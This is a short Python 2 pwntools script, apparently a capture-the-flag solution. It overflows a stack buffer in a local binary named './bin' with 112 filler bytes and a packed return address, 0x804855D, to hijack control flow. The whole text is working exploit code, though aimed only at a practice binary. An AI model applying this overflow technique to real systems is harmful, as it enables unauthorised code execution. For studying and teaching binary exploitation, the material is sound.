from pwn import *
#context.log_level = 'debug'

con = process('./bin')
con.send('a'*112+p32(0x804855D))
print con.recv()
